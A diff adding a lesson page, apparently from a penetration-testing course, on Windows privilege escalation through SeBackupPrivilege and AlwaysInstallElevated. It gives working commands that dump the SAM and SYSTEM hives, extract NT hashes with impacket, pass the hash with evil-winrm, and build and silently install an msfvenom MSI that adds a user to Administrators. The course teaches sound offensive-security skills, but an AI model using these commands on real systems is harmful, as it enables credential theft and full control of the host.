@@ -1,0 +1,92 @@
+---
+title: Dangerous Privileges and Installers
+module: windows-privilege-escalation
+moduleTitle: Windows Privilege Escalation
+moduleOrder: 19
+moduleIcon: ChevronsUp
+order: 4
+summary: SeBackup reads any file, AlwaysInstallElevated runs your MSI as SYSTEM. Both are gifts admins leave behind.
+estimatedMinutes: 17
+objectives:
+  - Abuse SeBackupPrivilege to read files your account cannot open normally
+  - Detect and exploit AlwaysInstallElevated for a SYSTEM MSI
+  - Recognize other high-value privileges on a token
+tags:
+  - windows
+  - privilege-escalation
+  - privileges
+  - installers
+---
+
+Not every path to SYSTEM is a service or a token trick. Some Windows privileges and policy settings are so powerful that having them at all is the vulnerability. You already know to read `whoami /priv` first. This lesson is what to do when the interesting line isn't `SeImpersonatePrivilege`.
+
+## SeBackupPrivilege
+
+Backup Operators exist to copy files for backups, so their privilege ignores file ACLs on read. That means you can read files your account has no business opening, including the registry hives that hold password hashes. You don't get to run code, but you get the hashes, and hashes are as good as a login.
+
+The move is to dump the SAM and SYSTEM hives, pull them to your box, and extract hashes offline.
+
+<CommandBlock
+  commands={[
+    { cmd: "reg save HKLM\\SAM C:\\Temp\\sam.hive", comment: "SeBackup lets this succeed even without admin rights on the key" },
+    { cmd: "reg save HKLM\\SYSTEM C:\\Temp\\system.hive", comment: "SYSTEM hive holds the boot key that decrypts SAM" },
+  ]}
+/>
+
+Copy both files off the host, then crack them open with impacket on your attacker box.
+
+<CommandCard command="impacket-secretsdump -sam sam.hive -system system.hive LOCAL" explain="Reconstructs the local account NT hashes. Take the Administrator hash straight into a pass-the-hash login with evil-winrm." />
+
+Once you have the local Administrator NT hash, you rarely need to crack it. Pass it directly: `evil-winrm -i TARGET -u Administrator -H <nthash>`.
+
+## AlwaysInstallElevated
+
+This one is pure carelessness. When both a machine-wide and a per-user registry value are set to 1, Windows installs any MSI package with SYSTEM privileges, no matter who runs it. Check both keys, because it only works when both are on.
+
+<CommandBlock
+  commands={[
+    { cmd: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", comment: "Machine-wide half" },
+    { cmd: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", comment: "Per-user half, both must read 0x1" },
+  ]}
+/>
+
+If both return `0x1`, build a malicious MSI and run it. msfvenom makes the package.
+
+<CommandBlock
+  commands={[
+    { cmd: "msfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o eco.msi", comment: "Adds you to Administrators when the MSI installs as SYSTEM" },
+    { cmd: "msiexec /quiet /qn /i C:\\Temp\\eco.msi", comment: "/quiet and /qn suppress the installer UI" },
+  ]}
+/>
+
+## The rest of the token
+
+A few other privileges are worth knowing on sight. `SeRestorePrivilege` is the write-side twin of SeBackup and lets you overwrite protected files, including swapping a binary that runs as SYSTEM. `SeTakeOwnership` lets you seize any object and then re-ACL it to yourself. `SeDebugPrivilege`, usually only on admins already, lets you inject into a SYSTEM process. If you see one of these Enabled and you're not admin, you have a path.
+
+<Callout type="security" title="Authorized targets only">
+Dumping SAM hashes and installing a SYSTEM MSI both give you full control of the host and its credentials. Only do this on machines you own or are explicitly authorized to test. Never exfiltrate real credential material outside an authorized engagement.
+</Callout>
+
+<Callout type="info" title="Why the hash is enough">
+Windows local auth accepts the NT hash directly through NTLM, so a pass-the-hash login needs no plaintext. That is why SeBackup, which only reads files, still ends the game: it hands you the hash, and the hash logs in.
+</Callout>
+
+<Quiz
+  id="always-install"
+  question="You find AlwaysInstallElevated set to 0x1 only under HKCU, and 0x0 under HKLM. Can you exploit it?"
+  answer={1}
+  options={[
+    "Yes, the per-user key is enough on its own",
+    "No, both HKCU and HKLM must be 0x1 for the elevated install to happen",
+    "Yes, but only if you are already an administrator",
+    "No, AlwaysInstallElevated only works on domain controllers",
+  ]}
+  explanation="The elevated install only triggers when both the machine and user registry values are set to 1. One half alone does nothing, so this box is not vulnerable through that path."
+/>
+
+<Exercise
+  id="privilege-map"
+  prompt="On a lab box, query both AlwaysInstallElevated keys and check whoami /priv for SeBackupPrivilege. For whichever one is present, write the exact next command you would run and what it gives you."
+/>
+
+<Notes />
